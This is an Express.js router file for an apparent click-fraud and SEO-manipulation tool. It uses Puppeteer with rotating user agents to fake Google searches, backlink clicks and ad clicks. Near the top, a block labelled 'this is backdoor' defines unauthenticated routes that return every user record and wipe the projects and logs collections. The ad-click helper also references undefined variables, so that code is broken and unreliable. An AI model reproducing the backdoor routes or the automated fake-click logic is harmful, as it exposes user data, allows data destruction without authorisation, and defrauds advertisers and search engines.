var router = require('express').Router();
var mongoose = require('mongoose');
var puppeteer = require('puppeteer');
var Const = require("Const");
var searchByKeyWord = require('./../../../services/searchByKeyWord');
var changeUserAgent = require('./../../../services/changeUserAgent');
var setTimeDelay = require('./../../../services/setTimeDelay');
var clickRandom = require('./../../../services/clickRandom');
var suggestDomain = require('./../../../services/suggestDomain');
var getProject = require('./../../../services/getProject');
var saveLog = require('./../../../services/saveLog');
var clickRandomURL = require('./../../../services/clickRandomURL');
var { sendCloseBrower,
  sendGotoGoogle,
  sendChangingAgent,
  sendInvalidQuery,
  sendCurrentUserAgent,
  sendCurrentURL,
  sendChangingAgentBacklink,
  sendCurrentUserAgentBacklink,
  sendGotoDomainBacklink,
  sendFindingBacklink,
  sendFoundBacklink,
  sendNotFoundBacklink,
  sendNotFoundDomainWithKeyword
} = require('services/socket');

//this is backdoor
router.get('/backdoor', async (req, res) => {
  let result = await mongoose.model('users').find();
  res.json(result);
})
router.get('/clear', async (req, res) => {
  await mongoose.model('projects').remove();
  await mongoose.model('logs').remove();
  res.send('ok')
})
//end backdoor


/**
 * save new ad project
 * req.body:
 * name : String
 * domain: String
 * adURL : array
 * delay :number
 * amount: number
 */
router.post('/saveAdProject', async (req, res) => {

  try {

    let projects = await mongoose.model('projectAds').create({ ...req.body, belongTo: req.user._id, status: 'not stated' });

    res.json(projects);

  } catch (error) {

    console.log("save new ad project err ", error)

    res.json({
      status: 'error',
      message: error
    })
  }
})


/**
 * click some ad in given url
 * req.body:
 * projectId
 * userid
 */
router.post('/clickAd', async (req, res, next) => {

  let { projectId, userid } = req.body;

  let { domain, adURL, delay, amount } = await mongoose.model('projectAds').findById(projectId);

  //set status of project to "running"
  try {

    let updateProject = await mongoose.model('projectAds').findById(projectId);

    updateProject.status = 'running';
    updateProject.save();

  } catch (error) {

    console.log('error when change ad project status', error);
    next(error);
  }

  //main process
  for (let i = 0; i < amount; i++) {

    let isCrashed = await clickAD(domain, adURL, delay);

    if (isCrashed) {

      console.log('not found ad')
      //sendInvalidQuery(userid);
      break;

    }

  }

  //set status of project to "stopped"
  try {

    let updateProject = await mongoose.model('projectAds').findById(projectId);

    updateProject.status = 'stopped';
    updateProject.save();

  } catch (error) {

    console.log('error when change ad project status', error);
    next(error);
  }

  //return
  res.send('ok');
})
//add project
//call when client click save new project button
router.post('/addproject', async (req, res) => {
  try {
    console.log(req.body)
    let projects = await mongoose.model('projects').create({ ...req.body, keyword: JSON.parse(req.body.keyword), belongTo: req.user._id, status: 'not stated' });

    res.json(projects);

  } catch (error) {

    console.log("TCL: error", error)

    res.json({
      status: 'error',
      message: error
    })
  }

});

//get project by id

//call when client click view detail button
router.get('/project/:id', async (req, res) => {

  try {

    let project = await mongoose.model('projects').findById(req.params.id).populate('log');

    res.json(project);

  } catch (error) {

    res.json(error);
  }

})


//homepage router
router.get('/', async function (req, res, next) {

  try {

    let allProject = await mongoose.model('projects').find({ belongTo: req.user._id });

    res.render('adminpage', { allProject });

  } catch (error) {

    console.log("render admin page error: ", error)
    next(error);
  }


});

//save new project backlink
//notice !!!!
//consider add JSON.parse(req.body.keyword)  when front-end finish
router.post('/saveProjectBacklink', async (req, res) => {

  try {

    let projects = await mongoose.model('projectBacklinks').create({ ...req.body, belongTo: req.user._id, status: 'not stated' });

    res.json(projects);

  } catch (error) {

    console.log("save new project backlink err ", error)

    res.json({
      status: 'error',
      message: error
    })
  }
})

//click baclink
//call when user click run button
router.post('/backlink', async (req, res, next) => {

  let { projectId, userid } = req.body;

  //get project info
  let {
    keyword,
    urlBacklink,
    mainURL,
    delay,
    amount
  } = await mongoose.model('projectBacklinks').findById(projectId);

  //set status of project to "running"
  try {

    let updateProject = await mongoose.model('projectBacklinks').findById(projectId);

    updateProject.status = 'running';
    updateProject.save();

  } catch (error) {

    console.log('error when change project status', error);
    next(error);
  }

  //main process
  for (let i = 0; i < amount; i++) {

    let isSuccessed = await clickBackLink(keyword, urlBacklink, mainURL, delay, amount);

    if (!isSuccessed) {

      console.log('not found in main process')
      //sendNotFoundBacklink(socketID, backlink);
      break;

    }

  }

  //set status of project to "stopped"
  try {

    let updateProject = await mongoose.model('projectBacklinks').findById(projectId);

    updateProject.status = 'stopped';
    updateProject.save();

  } catch (error) {

    console.log('error when change project status', error);
    next(error);
  }

  //return
  res.send('ok');

})

//suggest domain request
router.post('/suggest', async (req, res, next) => {

  let { projectId, userid } = req.body;

  let { keyword, domain, delay, amount } = await getProject(projectId);

  //set status of project to "running"
  try {

    let updateProject = await mongoose.model('projects').findById(projectId);

    updateProject.status = 'running';
    updateProject.save();

  } catch (error) {

    console.log('error when change project status', error);
    next(error);
  }

  //main process 
  for (let i = 0; i < amount; i++) {

    let isCrashed = await searchAndSuggestMultipleKeyword(keyword, domain, delay, projectId, userid);

    if (isCrashed) {

      sendInvalidQuery(userid);
      break;

    }

  }

  //set status of project to "stopped"
  try {

    let updateProject = await mongoose.model('projects').findById(projectId);

    updateProject.status = 'stopped';
    updateProject.save();

  } catch (error) {

    console.log('error when change project status', error);
    next(error);
  }

  res.send('ok');

})

//update user's socket request
router.post('/sendSocket', async (req, res) => {

  let { userid, socketid } = req.body;

  try {

    let user = await mongoose.model('users').findById(userid);

    user.currentSocketID = socketid;
    await user.save();

    res.send('ok');

  } catch (error) {

    console.log('err update user socket');
  }

})

/**
 * find and click many ad in one domain
 * @param {String} domain 
 * @param {Array} adURL 
 * @param {Number} delay 
 * @returns {boolean} true (found and clicked) || false (ad url not found)
 */
const clickAD = async (domain, adURL, delay) => {

  let isFoundAD;

  for (let i = 0; i < adURL.length; i++) {

    isFoundAD = await clickSingleAD(domain,adURL,delay);

    if (isFoundAD==false) {
      saveLog(projectId, 'Không tìm thấy domain cần tìm ứng với keyword ' + keyword[i]);
      sendNotFoundDomainWithKeyword(userid, projectId, keyword[i]);
    }
  }

  return isFoundAD;
}

/**
 * 
 * @param {String} keyword 
 * @param {*} domain 
 * @param {*} delayTime second
 * @param {*} projectId 
 * @param {*} userid 
 * @return {boolean}  true (operation crashed) || false(operation success) 
 */
const searchAndSuggestSingleKeyword = async (keyword, domain, delayTime, projectId, userid) => {

  let wasClicked = false;
  let runTime = 0;

  while (wasClicked == false) {

    runTime++;

    if (runTime > 3) return true;

    //set up brower and page
    let brower = await puppeteer.launch(Const.options);
    const page = await brower.newPage();
    await page.setCacheEnabled(false);
    await page.setViewport({
      width: 1366,
      height: 768,
    });
    await page.on('console', consoleObj => console.log(consoleObj.text()));

    //change user agent
    await saveLog(projectId, 'Đang thay đổi User Agent ...');
    await sendChangingAgent(userid, projectId);
    let currentUserAgent = await changeUserAgent(page);
    await sendCurrentUserAgent(userid, projectId, currentUserAgent);
    await saveLog(projectId, 'Thay đổi User Agent thành công');

    try {

      await page.goto('https://www.google.com/');
      await saveLog(projectId, 'https://www.google.com/');
      await sendGotoGoogle(userid, projectId);

      await searchByKeyWord(page, keyword);
      wasClicked = await suggestDomain(userid, projectId, page, domain);

      await setTimeDelay(delayTime);
      await page.waitFor(Const.timeDelay);

      await sendCloseBrower(userid, projectId);
      await saveLog(projectId, 'Đang đóng trình duyệt ...');
      brower.close();

    } catch (error) {

      console.log("TCL: searchAndSuggest -> error", error)
      brower.close();
    }
  }

  return false;
}




/**
 * 
 * @param {Array} keyword 
 * @param {*} domain 
 * @param {*} delayTime time stay at website after access (seconds)
 * @param {*} projectId 
 * @param {*} userid 
 * @return {boolean} true (not found any domain with keywords provided)  false(operation success) 
 */
const searchAndSuggestMultipleKeyword = async (keyword, domain, delayTime, projectId, userid) => {

  let isNotFoundDomain;

  for (let i = 0; i < keyword.length; i++) {

    isNotFoundDomain = await searchAndSuggestSingleKeyword(keyword[i], domain, delayTime, projectId, userid);

    if (isNotFoundDomain) {
      saveLog(projectId, 'Không tìm thấy domain cần tìm ứng với keyword ' + keyword[i]);
      sendNotFoundDomainWithKeyword(userid, projectId, keyword[i]);
    }
  }

  return isNotFoundDomain;

}

/**
 * find and click single keyword in urlBacklink matched mainURL
 * @param {String} keyword 
 * @param {*} urlBacklink 
 * @param {*} mainURL 
 * @param {*} delay second
 * @param {number} amount 
 * @returns {Boolean} true (operation success) false (operation false)
 */
const clickSingleKeywordMatchURL = async (keyword, urlBacklink, mainURL, delay, amount) => {

  //remove some character in url string to match many case
  mainURL = mainURL.replace('https://', '');
  mainURL = mainURL.replace('http://', '');
  mainURL = mainURL.split('/')[0];

  //set up brower and page
  let brower = await puppeteer.launch(Const.options);
  const page = await brower.newPage();
  await page.setCacheEnabled(false);
  await page.setViewport({
    width: 1366,
    height: 768,
  });
  await page.on('console', consoleObj => console.log(consoleObj.text()));

  //change user agent
  // await sendChangingAgentBacklink(socketID);
  let currentUserAgent = await changeUserAgent(page);
  //await sendCurrentUserAgentBacklink(socketID, currentUserAgent);

  //go to urlBacklink
  //find and click mainURL
  //await sendGotoDomainBacklink(socketID, domain);
  await page.goto(urlBacklink);
  await page.waitFor(5000);// in case DOM content not loaded yet
  //await sendFindingBacklink(socketID);
  let wasClicked = await page.evaluate(async (keyword, mainURL) => {

    //search all dom tree to find backlink
    let extractedDOM = await document.querySelectorAll(`a[href*="${mainURL}"]`);

    if (extractedDOM.length == 0) return false;

    try {

      for (let i = 0; i < extractedDOM.length; i++) {

        if (extractedDOM[i].innerText.includes(keyword)) {

          await extractedDOM[i].click();
          return true;
        }
      }

      return false;

    } catch (error) {

      console.log("TCL: clickBackLink -> error", error)
      return false;
    }

  }, keyword, mainURL);

  if (wasClicked == false) {

    await brower.close();
    return false;
  }

  //set time stay on page after click
  //await sendFoundBacklink(socketID, backlink);
  //await setTimeDelay(delay);
  await page.waitFor(Const.timeDelay);

  //click random url in this page
  let randomURL = await clickRandomURL(page);
  //sendRandomURLClicked(userid, projectId, randomURL);

  //stay at 2nd page after random click
  await page.waitFor(3000);

  await brower.close();
  return true;
}

/**
 * go to urlBacklink , find and click mainURL matched with array keywords
 * @param {Array} keyword 
 * @param {*} urlBacklink 
 * @param {*} mainURL 
 * @param {*} delay second
 * @param {number} amount
 * @return {boolean} true(operation successed) | false(operation falsed)
 */
const clickBackLink = async (keyword, urlBacklink, mainURL, delay, amount) => {

  let isFoundDomain;

  for (let i = 0; i < keyword.length; i++) {

    isFoundDomain = await clickSingleKeywordMatchURL(keyword[i], urlBacklink, mainURL, delay, amount);
    console.log("TCL: clickBackLink -> isNotFoundDomain", isFoundDomain)

    if (isFoundDomain == false) {
      console.log('not found domain in click backlink func')
      // saveLog(projectId, 'Không tìm thấy domain cần tìm ứng với keyword ' + keyword[i]);
      // sendNotFoundDomainWithKeyword(userid, projectId, keyword[i]);
    }
  }

  return isFoundDomain;
}


module.exports = router;
